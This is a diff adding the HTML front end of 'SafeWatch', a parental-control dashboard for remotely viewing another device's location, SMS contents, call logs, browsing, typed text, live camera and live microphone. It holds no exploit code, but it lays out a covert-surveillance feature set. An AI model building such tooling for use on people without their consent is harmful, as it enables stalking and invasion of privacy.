@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafeWatch — Parental Control Command Center</title>
+    <meta name="description" content="SafeWatch parent dashboard — monitor your child's device in real-time for safety and peace of mind.">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <!-- Leaflet for live map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</head>
+<body>
+<div class="app-container">
+
+    <!-- ═══ SIDEBAR ═══════════════════════════════════════════════════════ -->
+    <aside class="sidebar" id="sidebar">
+        <div class="brand">
+            <div class="logo-icon">🛡️</div>
+            <div class="brand-text">
+                <h1>SafeWatch</h1>
+                <span>Parent Console</span>
+            </div>
+        </div>
+
+        <nav>
+            <a href="#" class="nav-item active" data-target="overview" id="nav-overview">
+                <span class="nav-icon">🏠</span> Overview
+            </a>
+            <a href="#" class="nav-item" data-target="battery" id="nav-battery">
+                <span class="nav-icon">🔋</span> Battery &amp; Device
+            </a>
+            <a href="#" class="nav-item" data-target="network" id="nav-network">
+                <span class="nav-icon">📡</span> Network / IP
+            </a>
+            <a href="#" class="nav-item" data-target="location" id="nav-location">
+                <span class="nav-icon">📍</span> Live Location
+            </a>
+            <a href="#" class="nav-item" data-target="apps" id="nav-apps">
+                <span class="nav-icon">📱</span> App Control
+            </a>
+            <a href="#" class="nav-item" data-target="websites" id="nav-websites">
+                <span class="nav-icon">🌐</span> Website History
+            </a>
+            <a href="#" class="nav-item" data-target="calls" id="nav-calls">
+                <span class="nav-icon">📞</span> Call Logs
+            </a>
+            <a href="#" class="nav-item" data-target="sms" id="nav-sms">
+                <span class="nav-icon">💬</span> SMS Logs
+            </a>
+            <a href="#" class="nav-item" data-target="storage" id="nav-storage">
+                <span class="nav-icon">💾</span> Storage
+            </a>
+            <a href="#" class="nav-item" data-target="camera" id="nav-camera">
+                <span class="nav-icon">📷</span> Live Camera
+            </a>
+            <a href="#" class="nav-item" data-target="mic" id="nav-mic">
+                <span class="nav-icon">🎤</span> Live Mic
+            </a>
+            <a href="#" class="nav-item" data-target="touch" id="nav-touch">
+                <span class="nav-icon">👆</span> Touch Activity
+            </a>
+        </nav>
+
+        <!-- Connection status — auto-connects on load, no inputs needed -->
+        <div class="sidebar-bottom">
+            <div class="server-config">
+                <div class="server-host-label" id="server-host-label">
+                    🌐 <span id="server-host-display">Connecting...</span>
+                </div>
+            </div>
+            <div class="connection-status">
+                <span class="status-dot offline" id="status-dot"></span>
+                <span id="status-text">Connecting…</span>
+            </div>
+            <div class="child-status" id="child-status-bar">
+                <span class="child-dot offline" id="child-dot"></span>
+                <span id="child-status-text">Child Offline</span>
+            </div>
+            <button id="btnReconnect" class="btn-reconnect" title="Manually reconnect">↩ Reconnect</button>
+        </div>
+    </aside>
+
+    <!-- ═══ MAIN CONTENT ══════════════════════════════════════════════════ -->
+    <main class="main-content">
+        <!-- Header -->
+        <header class="top-bar">
+            <div class="header-left">
+                <h2 id="page-title">Overview</h2>
+                <div class="last-update" id="last-update">—</div>
+            </div>
+            <div class="header-actions">
+                <button id="btn-lock" class="btn-action btn-danger" title="Lock child device">
+                    🔒 Lock Device
+                </button>
+                <button id="btn-snapshot" class="btn-action btn-secondary" title="Request all data now">
+                    🔄 Refresh
+                </button>
+            </div>
+        </header>
+
+        <!-- ── OVERVIEW ─────────────────────────────────────────────── -->
+        <section class="view active" id="view-overview">
+            <div class="summary-grid">
+                <div class="summary-card" id="sc-battery">
+                    <div class="sc-icon">🔋</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-battery">—</div>
+                        <div class="sc-label">Battery</div>
+                    </div>
+                </div>
+                <div class="summary-card" id="sc-location">
+                    <div class="sc-icon">📍</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-location">—</div>
+                        <div class="sc-label">Last Location</div>
+                    </div>
+                </div>
+                <div class="summary-card" id="sc-network">
+                    <div class="sc-icon">📡</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-network">—</div>
+                        <div class="sc-label">Network</div>
+                    </div>
+                </div>
+                <div class="summary-card" id="sc-storage">
+                    <div class="sc-icon">💾</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-storage">—</div>
+                        <div class="sc-label">Storage Used</div>
+                    </div>
+                </div>
+                <div class="summary-card" id="sc-calls">
+                    <div class="sc-icon">📞</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-calls">—</div>
+                        <div class="sc-label">Last Call</div>
+                    </div>
+                </div>
+                <div class="summary-card" id="sc-active-app">
+                    <div class="sc-icon">📱</div>
+                    <div class="sc-info">
+                        <div class="sc-value" id="ov-active-app">—</div>
+                        <div class="sc-label">Last Active App</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="recent-activity-card">
+                <h3>Live Activity Feed</h3>
+                <ul class="activity-feed" id="activity-feed">
+                    <li class="feed-item system">System ready — waiting for child device...</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- ── BATTERY ──────────────────────────────────────────────── -->
+        <section class="view" id="view-battery">
+            <div class="panel-grid">
+                <div class="info-card">
+                    <h3>Battery Status</h3>
+                    <div class="battery-ring-wrap">
+                        <svg class="battery-ring" viewBox="0 0 120 120">
+                            <circle class="ring-bg" cx="60" cy="60" r="50" />
+                            <circle class="ring-fill" id="battery-ring-fill" cx="60" cy="60" r="50"
+                                stroke-dasharray="314" stroke-dashoffset="314" />
+                        </svg>
+                        <div class="battery-ring-text">
+                            <span id="bat-percent">—</span>
+                            <small>%</small>
+                        </div>
+                    </div>
+                    <div class="info-rows" id="battery-details">
+                        <div class="info-row"><span>Status</span><span id="bat-status">—</span></div>
+                        <div class="info-row"><span>Charge Source</span><span id="bat-source">—</span></div>
+                        <div class="info-row"><span>Health</span><span id="bat-health">—</span></div>
+                        <div class="info-row"><span>Temperature</span><span id="bat-temp">—</span></div>
+                        <div class="info-row"><span>Voltage</span><span id="bat-voltage">—</span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── NETWORK / IP ─────────────────────────────────────────── -->
+        <section class="view" id="view-network">
+            <div class="panel-grid">
+                <div class="info-card">
+                    <h3>📡 Network Information</h3>
+                    <div class="info-rows">
+                        <div class="info-row"><span>Network Type</span><span id="net-type">—</span></div>
+                        <div class="info-row"><span>WiFi SSID</span><span id="net-ssid">—</span></div>
+                        <div class="info-row"><span>WiFi IP Address</span><span id="net-wifi-ip" class="mono">—</span></div>
+                        <div class="info-row"><span>Carrier</span><span id="net-carrier">—</span></div>
+                        <div class="info-row"><span>All Interfaces</span><span id="net-all-ips" class="mono small">—</span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── LIVE LOCATION ────────────────────────────────────────── -->
+        <section class="view" id="view-location">
+            <div class="location-layout">
+                <div id="leaflet-map"></div>
+                <div class="info-card location-info">
+                    <h3>📍 GPS Data</h3>
+                    <div class="info-rows">
+                        <div class="info-row"><span>Latitude</span><span id="loc-lat" class="mono">—</span></div>
+                        <div class="info-row"><span>Longitude</span><span id="loc-lng" class="mono">—</span></div>
+                        <div class="info-row"><span>Accuracy</span><span id="loc-accuracy">—</span></div>
+                        <div class="info-row"><span>Altitude</span><span id="loc-altitude">—</span></div>
+                        <div class="info-row"><span>Speed</span><span id="loc-speed">—</span></div>
+                        <div class="info-row"><span>Provider</span><span id="loc-provider">—</span></div>
+                        <div class="info-row"><span>Updated</span><span id="loc-updated">—</span></div>
+                    </div>
+                    <a id="loc-maps-link" href="#" target="_blank" class="btn-action btn-secondary" style="margin-top:12px;display:inline-block">
+                        🗺️ Open in Google Maps
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── APP CONTROL ──────────────────────────────────────────── -->
+        <section class="view" id="view-apps">
+            <div class="info-card full-width">
+                <h3>📱 App Usage (Last 24h)</h3>
+                <p class="hint">Toggle the switch to block / unblock an app on the child device.</p>
+                <div id="app-list" class="app-list">
+                    <div class="empty-state">Waiting for app data...</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── WEBSITE HISTORY ──────────────────────────────────────── -->
+        <section class="view" id="view-websites">
+            <div class="info-card full-width">
+                <h3>🌐 Website Visits</h3>
+                <p class="hint">URLs captured from browser address bar via Accessibility Service.</p>
+                <div class="data-table-container">
+                    <table class="data-table">
+                        <thead><tr><th>URL</th><th>Browser</th><th>Time</th></tr></thead>
+                        <tbody id="websites-tbody"><tr><td colspan="3" class="empty">No visits logged yet</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── CALL LOGS ────────────────────────────────────────────── -->
+        <section class="view" id="view-calls">
+            <div class="info-card full-width">
+                <h3>📞 Call Logs</h3>
+                <div class="data-table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Name / Number</th>
+                                <th>Type</th>
+                                <th>Duration</th>
+                                <th>Date &amp; Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calls-tbody"><tr><td colspan="4" class="empty">No call logs yet</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── SMS LOGS ─────────────────────────────────────────────── -->
+        <section class="view" id="view-sms">
+            <div class="info-card full-width">
+                <h3>💬 SMS Messages</h3>
+                <div class="data-table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Contact</th>
+                                <th>Type</th>
+                                <th>Message</th>
+                                <th>Date</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sms-tbody"><tr><td colspan="4" class="empty">No SMS yet</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── STORAGE ──────────────────────────────────────────────── -->
+        <section class="view" id="view-storage">
+            <div class="panel-grid">
+                <div class="info-card">
+                    <h3>💾 Internal Storage</h3>
+                    <div id="storage-internal">
+                        <div class="storage-bar-wrap">
+                            <div class="storage-bar"><div class="storage-bar-fill" id="storage-bar-int" style="width:0%"></div></div>
+                            <span id="storage-int-text">—</span>
+                        </div>
+                        <div class="info-rows">
+                            <div class="info-row"><span>Total</span><span id="stor-int-total">—</span></div>
+                            <div class="info-row"><span>Used</span><span id="stor-int-used">—</span></div>
+                            <div class="info-row"><span>Free</span><span id="stor-int-free">—</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="info-card">
+                    <h3>📂 Category Breakdown</h3>
+                    <div id="storage-breakdown">
+                        <div class="empty-state">Waiting for data...</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── LIVE CAMERA ──────────────────────────────────────────── -->
+        <section class="view" id="view-camera">
+            <div class="info-card full-width">
+                <div class="camera-header">
+                    <h3>📷 Live Camera Feed</h3>
+                    <div class="camera-controls">
+                        <button id="btn-camera-on"  class="btn-action btn-success">▶ Start Camera</button>
+                        <button id="btn-camera-off" class="btn-action btn-danger" style="display:none">⏹ Stop Camera</button>
+                        <span id="camera-fps" class="fps-badge">— fps</span>
+                    </div>
+                </div>
+                <div class="camera-feed-wrap">
+                    <img id="camera-feed" src="" alt="Live camera feed" class="camera-feed" />
+                    <div id="camera-placeholder" class="camera-placeholder">
+                        <div>📷</div>
+                        <p>Camera is off. Click "Start Camera" to begin live stream.</p>
+                    </div>
+                </div>
+                <div class="camera-meta">
+                    <span id="cam-frame-count">0 frames received</span>
+                    <span id="cam-last-update">—</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── LIVE MIC ─────────────────────────────────────────────── -->
+        <section class="view" id="view-mic">
+            <div class="info-card full-width">
+                <div class="camera-header">
+                    <h3>🎤 Live Microphone</h3>
+                    <div class="camera-controls">
+                        <button id="btn-mic-on"  class="btn-action btn-success">▶ Start Mic</button>
+                        <button id="btn-mic-off" class="btn-action btn-danger" style="display:none">⏹ Stop Mic</button>
+                    </div>
+                </div>
+                <div class="audio-visualizer-wrap">
+                    <canvas id="audio-canvas" width="800" height="200"></canvas>
+                    <div id="mic-placeholder" class="camera-placeholder">
+                        <div>🎤</div>
+                        <p>Mic is off. Click "Start Mic" to begin audio monitoring.<br>
+                        <small style="opacity:0.6">Audio is decoded and played back in-browser.</small></p>
+                    </div>
+                </div>
+                <div class="audio-player-wrap" id="audio-player-wrap" style="display:none">
+                    <audio id="audio-player" controls style="width:100%"></audio>
+                    <p class="hint">Live audio chunks are queued for playback.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── TOUCH ACTIVITY ───────────────────────────────────────── -->
+        <section class="view" id="view-touch">
+            <div class="info-card full-width">
+                <div class="touch-header">
+                    <h3>👆 Touch &amp; Activity Log</h3>
+                    <div>
+                        <label class="filter-label">Filter:
+                            <select id="touch-filter">
+                                <option value="all">All Events</option>
+                                <option value="TAP">Taps</option>
+                                <option value="TEXT_INPUT">Text Input</option>
+                                <option value="APP_SWITCH">App Switches</option>
+                                <option value="SCROLL">Scrolls</option>
+                                <option value="NOTIFICATION">Notifications</option>
+                                <option value="APP_BLOCKED">Blocked Apps</option>
+                            </select>
+                        </label>
+                        <button id="btn-clear-touch" class="btn-action btn-secondary" style="margin-left:8px">🗑 Clear</button>
+                    </div>
+                </div>
+                <ul class="touch-feed" id="touch-feed">
+                    <li class="feed-item system">Waiting for touch events...</li>
+                </ul>
+            </div>
+        </section>
+
+    </main>
+</div>
+
+<script src="app.js?v=3"></script>
+</body>
+</html>
